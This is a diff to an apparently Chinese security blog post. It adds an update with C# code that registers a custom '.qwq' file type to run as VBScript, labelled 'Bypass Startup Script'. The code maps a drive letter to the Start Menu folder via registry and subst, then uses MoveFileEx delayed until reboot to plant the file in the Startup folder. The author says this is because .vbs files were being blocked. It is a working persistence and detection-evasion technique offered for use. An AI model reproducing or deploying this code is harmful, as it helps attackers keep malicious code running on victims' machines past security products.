@@ -81,6 +81,77 @@ namespace Demo
 
 ```
 
-# 后续完善
+# 2023/4/16更新
 
-自动识别未使用盘符
+有朋友测试发现vbs后缀被拦了，懒得搞其他冷门后缀了，直接自己搞个后缀吧
+
+```csharp
+using System;
+using System.IO;
+using Microsoft.Win32;
+using System.Diagnostics;
+using System.Runtime.InteropServices;
+
+namespace Demo
+{
+    internal class Program
+    {
+        [Flags]
+        enum MoveFileFlags
+        {
+            MOVEFILE_REPLACE_EXISTING = 0x00000001,
+            MOVEFILE_COPY_ALLOWED = 0x00000002,
+            MOVEFILE_DELAY_UNTIL_REBOOT = 0x00000004,
+            MOVEFILE_WRITE_THROUGH = 0x00000008,
+            MOVEFILE_CREATE_HARDLINK = 0x00000010,
+            MOVEFILE_FAIL_IF_NOT_TRACKABLE = 0x00000020
+        }
+      
+        public static void RegisterFileType()
+        {
+            RegistryKey softwareKey = Registry.ClassesRoot.OpenSubKey(".qwq");
+            if (softwareKey != null)
+            {
+                return;
+            }
+
+            RegistryKey fileTypeKey = Registry.ClassesRoot.CreateSubKey(".qwq");
+            string relationName = "QWQDANCHUN";
+            fileTypeKey.SetValue("", relationName);
+            fileTypeKey.Close();
+
+            RegistryKey relationKey = Registry.ClassesRoot.CreateSubKey(relationName);
+            relationKey.SetValue("", "Bypass Startup Script");
+
+            RegistryKey shellKey = relationKey.CreateSubKey("Shell");
+
+            RegistryKey openKey = shellKey.CreateSubKey("Open");
+
+            RegistryKey commandKey = openKey.CreateSubKey("Command");
+            commandKey.SetValue("", "wscript.exe //E:vbscript" + " %1");
+            relationKey.Close();
+        }
+
+        [return: MarshalAs(UnmanagedType.Bool)]
+        [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
+        static extern bool MoveFileEx(string lpExistingFileName, string lpNewFileName, MoveFileFlags dwFlags);
+        static void Main(string[] args)
+        {
+            File.WriteAllText("C:\\Windows\\Temp\\test.qwq", "msgbox(\"test\")");
+            string newdisk = "X:";
+            string filepath = "C:\\Windows\\Temp\\test.qwq";
+            string filename = "test.qwq";
+
+            string appdata = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
+            string programs = appdata + "\\Microsoft\\Windows\\Start Menu\\Programs";
+            RegistryKey registryKey = Registry.LocalMachine.OpenSubKey("SYSTEM\\CurrentControlSet\\Control\\Session Manager\\DOS Devices", true);
+            registryKey.SetValue(newdisk, "\\??\\" + programs);
+            Process.Start("subst", newdisk + " \"" + programs + "\"");
+            File.Copy(filepath, programs + "\\" + filename);
+            MoveFileEx(newdisk + "\\" + filename, newdisk + "\\Startup\\" + filename, MoveFileFlags.MOVEFILE_DELAY_UNTIL_REBOOT);
+            RegisterFileType();
+        }
+    }
+}
+
+```
